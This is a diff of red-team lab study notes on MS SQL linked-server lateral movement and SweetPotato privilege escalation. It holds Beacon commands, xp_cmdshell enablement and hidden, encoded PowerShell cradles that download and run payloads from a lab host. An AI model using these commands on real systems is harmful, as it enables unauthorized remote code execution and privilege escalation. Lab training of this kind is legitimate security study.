@@ -2,7 +2,7 @@
 description: 10/01/2025
 ---
 
-# MS SQL Servers
+# ✅ MS SQL Servers
 
 ## MS SQL Lateral Movement
 
@@ -489,3 +489,243 @@ beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a413
 
 **Experiment with using the pivot listener here instead of SMB.**
 {% endhint %}
+
+## MS SQL Lateral Movement
+
+SQL Servers have a concept called "links".
+
+These links allows a database instance to access data from an external source.
+
+MS SQL supports multiple sources, including other MS SQL servers. These can also be practically anywhere — include other domains, forests or in the cloud.
+
+**Discover any links that the current instance has:**
+
+```
+SELECT srvname, srvproduct, rpcout FROM master..sysservers;
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**This shows that SQL-2 has a link to SQL-1.  The SQLRecon `links` module could also be used:**
+
+```
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
+
+[*] Additional SQL links on sql-2.dev.cyberbotic.io,1433
+name | product | provider | data_source | 
+------------------------------------------
+SQL-1.CYBERBOTIC.IO | SQL Server | SQLNCLI | SQL-1.CYBERBOTIC.IO |
+```
+
+**We can send SQL queries to linked servers using&#x20;**_**OpenQuery**_**:**
+
+```
+SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
+```
+
+{% hint style="info" %}
+_**The use of double and single quotes is important when using OpenQuery.**_
+{% endhint %}
+
+**Or with SQLRecon:**
+
+```
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
+
+[*] Executing 'select @@servername' on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
+column0 | 
+----------
+SQL-1 |
+```
+
+**We can also check the xp\_cmdshell status.**
+
+```
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
+
+[*] Executing 'select name,value from sys.configurations WHERE name = ''xp_cmdshell''' on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
+name | value | 
+---------------
+xp_cmdshell | 0 |
+```
+
+If `xp_cmdshell` is disabled, you won't be able to enable it by executing `sp_configure` via `OpenQuery`. &#x20;
+
+**If RPC Out is enabled on the link (which is not the default configuration), then you can enable it using the following syntax:**
+
+```
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
+```
+
+{% hint style="info" %}
+The square braces are required.
+{% endhint %}
+
+We can query SQL-1 to find out if it has any further links.
+
+```
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
+
+[*] Additional SQL links on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
+[+] No results.
+```
+
+\
+
+
+In this case it does not, but manually querying each server to find additional links can be cumbersome and time-consuming.  Instead, `Get-SQLServerLinkCrawl` can automatically crawl all available links and shows you a bit of information for each instance.
+
+```
+beacon> powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
+
+Version     : SQL Server 2019 
+Instance    : SQL-2
+CustomQuery : 
+Sysadmin    : 1
+Path        : {SQL-2}
+User        : DEV\bfarmer
+Links       : {SQL-1.CYBERBOTIC.IO}
+
+Version     : SQL Server 2019 
+Instance    : SQL-1
+CustomQuery : 
+Sysadmin    : 1
+Path        : {SQL-2, SQL-1.CYBERBOTIC.IO}
+User        : sa
+Links       :
+```
+
+This output shows that the link from `SQL-2` to `SQL-1` is configured with a local `sa` account, and that it has sysadmin privileges on the remote server. &#x20;
+
+Your level of privilege on the linked server will depend on how the link is configured.  It's worth noting that in this particular case, any user who has public read access to the SQL-2 database instance will inherit sysadmin rights on SQL-1. &#x20;
+
+_**We do not need to be sysadmin on SQL-2 first.**_
+
+**The&#x20;**<mark style="color:yellow;">**`lwhoami`**</mark>**&#x20;module in SQLRecon can show similar information:**
+
+```
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
+
+[*] Determining user permissions on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
+[*] Logged in as sa
+[*] Mapped to the user dbo
+[*] Roles:
+ |-> User is a member of public role.
+ |-> User is NOT a member of db_owner role.
+ |-> User is NOT a member of db_accessadmin role.
+ |-> User is NOT a member of db_securityadmin role.
+ |-> User is NOT a member of db_ddladmin role.
+ |-> User is NOT a member of db_backupoperator role.
+ |-> User is NOT a member of db_datareader role.
+ |-> User is NOT a member of db_datawriter role.
+ |-> User is NOT a member of db_denydatareader role.
+ |-> User is NOT a member of db_denydatawriter role.
+ |-> User is a member of sysadmin role.
+ |-> User is a member of setupadmin role.
+ |-> User is a member of serveradmin role.
+ |-> User is a member of securityadmin role.
+ |-> User is a member of processadmin role.
+ |-> User is a member of diskadmin role.
+ |-> User is a member of dbcreator role.
+ |-> User is a member of bulkadmin role.
+```
+
+To execute a Beacon on `SQL-1`, we can pretty much repeat the same steps as previously.  However, note that `SQL-1` may only be able to talk to `SQL-2` and not to `WKSTN-2` or any other machine in the `DEV` domain.
+
+```
+beacon> run hostname
+sql-2
+
+beacon> getuid
+[*] You are DEV\mssql_svc (admin)
+
+beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+
+beacon> rportfwd 8080 127.0.0.1 80
+[+] started reverse port forward on 8080 to 127.0.0.1:80
+```
+
+**You can use `xp_cmdshell` on a linked server via `OpenQuery` (note that you need to prepend a dummy query) for it to work:**
+
+```
+SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')
+```
+
+**Or you can use the "AT" syntax:**
+
+```
+EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]
+```
+
+`SQLRecon` also has a convenient <mark style="color:yellow;">`lxpcmd`</mark> module.
+
+**Once the payload has been executed, connect to the Beacon:**
+
+```
+beacon> link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
+[+] established link to child beacon: 10.10.120.25
+```
+
+![](https://files.cdn.thinkific.com/file_uploads/584845/images/066/c4e/679/sql-1-beacon.png)
+
+## MS SQL Privilege Escalation
+
+This instance of SQL is running as <mark style="color:yellow;">`NT Service\MSSQLSERVER`</mark>, which is the default during more modern SQL installations.
+
+It has a _**special type of privilege**_ called <mark style="color:yellow;">`SeImpersonatePrivilege`</mark>, which allows the account to "<mark style="color:$danger;">impersonate a client after authentication</mark>".
+
+**How to:**
+
+```
+beacon> getuid
+[*] You are NT Service\MSSQLSERVER
+
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
+
+====== TokenPrivileges ======
+
+Current Token's Privileges
+
+                SeAssignPrimaryTokenPrivilege:  DISABLED
+                     SeIncreaseQuotaPrivilege:  DISABLED
+                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                SeIncreaseWorkingSetPrivilege:  DISABLED
+
+[*] Completed collection in 0.037 seconds
+```
+
+### At a high level
+
+This privilege allows the user to impersonate a token that it's able to get a handle to.
+
+However, since this account is not a local admin, it can't just get a handle to a higher-privileged process (e.g. `SYSTEM`) already running on the machine.
+
+A strategy that many hackers have come up with is to force a `SYSTEM` service to authenticate to a rogue service that the attacker creates and thus has control over.
+
+This rogue service is then able to impersonate the `SYSTEM` service while it is trying to authenticate.
+
+[**SweetPotato**](https://github.com/CCob/SweetPotato) **has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command:**
+
+```
+beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="
+
+SweetPotato by @_EthicalChaos_
+  Orignal RottenPotato code and exploit by @foxglovesec
+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
+[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+[+] Triggering notification on evil PIPE \\sql-1/pipe/b888d569-b66e-4280-b8c5-995afbb9b02c
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+
+beacon> connect localhost 4444
+[+] established link to child beacon: 10.10.120.25
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
